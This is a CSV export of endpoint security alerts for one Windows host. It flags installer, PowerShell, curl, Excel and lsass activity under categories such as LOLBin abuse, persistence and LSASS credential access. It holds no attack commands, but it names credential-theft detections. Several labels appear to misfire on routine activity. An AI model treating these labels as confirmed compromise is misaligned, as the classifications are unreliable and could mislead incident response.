"Jun 1, 2026 @ 14:23:12.339",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_nbmrvwln.k5p.ps1,,creation,"2,204",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-65881A73
"Jun 1, 2026 @ 14:21:44.260",C:\Windows\System32\msiexec.exe,C:\Windows\System32\msiexec.exe,c:\Windows\System32\MsiExec.exe -Embedding 17B454BD89D4606AD8583AC7E96BFAA3 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,end,"25,464",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-A973EF64
"Jun 1, 2026 @ 14:21:41.008",C:\Windows\SysWOW64\msiexec.exe,C:\Windows\System32\msiexec.exe,C:\Windows\syswow64\MsiExec.exe -Embedding 189C0A08651FD6F8AF60DDA3DCD42393 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,end,"37,284",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-03E12AB4
"Jun 1, 2026 @ 14:21:43.245",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF2710CA8D7EE71E47.TMP,,creation,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-2ADC4E91
"Jun 1, 2026 @ 14:21:44.241",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFE7A759CD128CD015.TMP,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-6CE0489F
"Jun 1, 2026 @ 14:21:44.232",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\CMP591.tmp,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-53F8EA0C
"Jun 1, 2026 @ 14:23:19.748",C:\Windows\System32\curl.exe,,,LOLBin Abuse,50,Living-off-the-land binary: curl.exe,127.0.0.1,127.0.0.1,,,,connection_accepted,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-6D1291D3
"Jun 1, 2026 @ 14:21:39.509",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFA6CF58F909D171E0.TMP,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-C31E8F74
"Jun 1, 2026 @ 14:23:13.169",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-5BAB9DCF
"Jun 1, 2026 @ 14:21:38.539",C:\Windows\System32\msiexec.exe,C:\Windows\System32\msiexec.exe,C:\Windows\System32\MsiExec.exe -Embedding 0F11E21D2A1C2C53A06BA3DAFA972429 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,start,"12,192",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-EA0310D2
"Jun 1, 2026 @ 14:23:14.247",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-5ED0B297
"Jun 1, 2026 @ 14:23:15.645",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_0ucesdw0.nn3.psm1,,creation,"11,540",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-E0AFE489
"Jun 1, 2026 @ 14:24:03.157",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,50,Living-off-the-land binary: wscript.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1002\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,,,modification,"33,896",T1059.005,Visual Basic,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-E0E4288A
"Jun 1, 2026 @ 14:24:03.156",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,50,Living-off-the-land binary: wscript.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1002\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,,,modification,"33,896",T1059.005,Visual Basic,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-B467142E
"Jun 1, 2026 @ 14:21:39.508",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFE03EA4ADE8ABB554.TMP,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-01D8392A
"Jun 1, 2026 @ 14:23:15.642",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_cwxcdz2s.bj5.ps1,,creation,"11,540",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-AA996E20
"Jun 1, 2026 @ 14:23:16.472",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-22B4B5B4
"Jun 1, 2026 @ 14:23:58.890",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-799B852B
"Jun 1, 2026 @ 14:23:20.080",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,,x1.c.lencr.org,lookup_result,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-D1FF4094
"Jun 1, 2026 @ 14:23:58.406",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,45,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_A7BRHFHZBWH4EDA4C7DUA7HKEEAABQHJ.R,,rename,"25,556",,,False,MEDIUM,MEDIUM,Needs Review,Review,Review process network history; identify C2 pattern,AH-9665ED45
"Jun 1, 2026 @ 14:23:58.421",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,45,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_DNE4CFAVASBNGQGKBJG5H7G2GBCNDPAJ.R,,creation,"25,556",,,False,MEDIUM,MEDIUM,Needs Review,Review,Review process network history; identify C2 pattern,AH-FF8EE7AA
"Jun 1, 2026 @ 14:21:38.020",C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teams.exe,,,External Communication | Rare Parent-Child | Rare Process,45,Process seen only 1 time(s): ms-teams.exe ; Rare process pair: -->ms-teams.exe ; Outbound to external IP: 52.168.117.170,173.10.254.170,52.168.117.170,,,,disconnect_received,"31,960",,,True,FP-SUPPRESSED,MEDIUM,Allowlisted / FP Suppressed,Review,Block destination IP at perimeter; review netflow,AH-BCBB0F61
"Jun 1, 2026 @ 14:23:37.003",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-033A82F3
"Jun 1, 2026 @ 14:23:37.022",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-A2427871
"Jun 1, 2026 @ 14:23:20.066",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,,x1.c.lencr.org,lookup_requested,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-EBE7BABB
"Jun 1, 2026 @ 14:23:58.528",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-3DEC82ED
"Jun 1, 2026 @ 14:23:58.413",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,45,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_H6GZFSHPCNBKBACEBUGJFFFUDXCSHZD7.R,,creation,"25,556",,,False,MEDIUM,MEDIUM,Needs Review,Review,Review process network history; identify C2 pattern,AH-D99F266E
"Jun 1, 2026 @ 14:23:36.386",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-5C567604
"Jun 1, 2026 @ 14:23:20.157",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,,r12.c.lencr.org,lookup_requested,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-8FB5CB0E
"Jun 1, 2026 @ 14:23:36.367",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-56B970D1
"Jun 1, 2026 @ 14:23:20.172",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,,r12.c.lencr.org,lookup_result,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-C977B647
"Jun 1, 2026 @ 14:23:41.030",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-61F3B6B9
"Jun 1, 2026 @ 14:23:40.941",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-4B4761F2
"Jun 1, 2026 @ 14:21:18.168",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\orgchart.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\orgchart.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-E369DF94
"Jun 1, 2026 @ 14:21:18.248",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\scanpst.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\scanpst.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-4C27EDD1
"Jun 1, 2026 @ 14:22:58.474",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,External Communication | LOLBin Abuse,40,Living-off-the-land binary: powershell.exe ; Outbound to external IP: 217.160.0.149,173.10.254.170,217.160.0.149,,,,disconnect_received,"1,860",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Block destination IP at perimeter; review netflow,AH-B0A732D9
"Jun 1, 2026 @ 14:21:18.171",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msosrec.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msosrec.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-7B4669D8
"Jun 1, 2026 @ 14:21:18.169",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\powerpnt.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powerpnt.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-D1010419
"Jun 1, 2026 @ 14:21:17.516",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msoadfsb.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msoadfsb.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-E33E6B06
"Jun 1, 2026 @ 14:21:17.511",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msoasb.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msoasb.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-A2A667CC
"Jun 1, 2026 @ 14:21:17.110",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\sdxhelper.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sdxhelper.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-0566DC90
"Jun 1, 2026 @ 14:21:16.667",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\winword.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winword.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-AD6296C9
"Jun 1, 2026 @ 14:21:18.136",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\mspub.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspub.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-36DD556C
"Jun 1, 2026 @ 14:21:45.815",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1041\thm.wxl,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-C11EF935
"Jun 1, 2026 @ 14:21:45.819",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1046\thm.wxl,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-0596CDBF
"Jun 1, 2026 @ 14:21:45.817",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1045\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-24CF2062
"Jun 1, 2026 @ 14:21:47.388",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1036\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-2B7DFBEC
"Jun 1, 2026 @ 14:21:47.389",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1040\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-20E2FE36
"Jun 1, 2026 @ 14:21:47.386",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1029\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-0700ED2A
"Jun 1, 2026 @ 14:21:47.387",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1031\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-F8BDE282
"Jun 1, 2026 @ 14:21:47.390",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1041\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-6CC0A5CE
"Jun 1, 2026 @ 14:21:47.391",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1042\thm.wxl,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-66CA8ABB
"Jun 1, 2026 @ 14:21:47.394",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1055\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-2EAD3033
"Jun 1, 2026 @ 14:21:47.393",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1046\thm.wxl,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-A5EB4B42
"Jun 1, 2026 @ 14:21:47.399",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\thm.wxl,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-F12DDEB9
"Jun 1, 2026 @ 14:21:47.396",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\3082\thm.wxl,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-279BC4E9
"Jun 1, 2026 @ 14:21:47.398",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-41104B4B
"Jun 1, 2026 @ 14:21:45.823",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\2052\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-7EBE900E
"Jun 1, 2026 @ 14:21:45.824",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\3082\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-742A988F
"Jun 1, 2026 @ 14:21:45.826",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-68C29731
"Jun 1, 2026 @ 14:21:47.384",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1028\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-135F40A2
"Jun 1, 2026 @ 14:21:47.049",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,,,modification,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-09160C62
"Jun 1, 2026 @ 14:23:19.842",C:\Windows\System32\curl.exe,,,External Communication | LOLBin Abuse,40,Living-off-the-land binary: curl.exe ; Outbound to external IP: 34.117.59.81,173.10.254.170,34.117.59.81,,,,connection_attempted,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Block destination IP at perimeter; review netflow,AH-EAAA5B63
"Jun 1, 2026 @ 14:21:45.808",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1028\thm.wxl,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-87889E29
"Jun 1, 2026 @ 14:21:45.810",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1031\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-821FA96A
